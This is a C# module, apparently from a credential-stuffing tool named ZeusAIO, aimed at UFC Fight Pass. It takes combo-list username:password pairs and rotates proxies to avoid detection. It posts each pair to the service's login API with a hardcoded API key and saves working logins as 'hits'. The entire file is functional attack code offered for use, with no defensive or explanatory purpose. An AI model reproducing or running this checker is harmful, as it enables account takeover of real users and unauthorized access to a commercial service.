using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace UfcTV
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("Connection", "keep-alive");
                            httpRequest.AddHeader("Origin", "https://ufcfightpass.com");
                            httpRequest.AddHeader("Realm", "dce.ufc");
                            httpRequest.AddHeader("Accept-Language", "en-US");
                            httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                            httpRequest.AddHeader("x-app-var", "4.20.6");
                            httpRequest.AddHeader("DNT", "1");
                            httpRequest.AddHeader("x-api-key", "857a1e5d-e35e-4fdf-805b-a87b6f8364bf");
                            httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
                            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                            httpRequest.AddHeader("Referer", "https://dce-frontoffice.imggaming.com/");
                            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                            string str = "{\"id\":\"" + s[0] + "\",\"secret\":\"" + s[1] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://dce-frontoffice.imggaming.com/api/v2/login", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("loginnotfound") || strResponse.Contains("NOT_FOUND"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("instruct") || strResponse.Contains("authorisationToken")) //hit
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - UFC] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/UfcTv_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
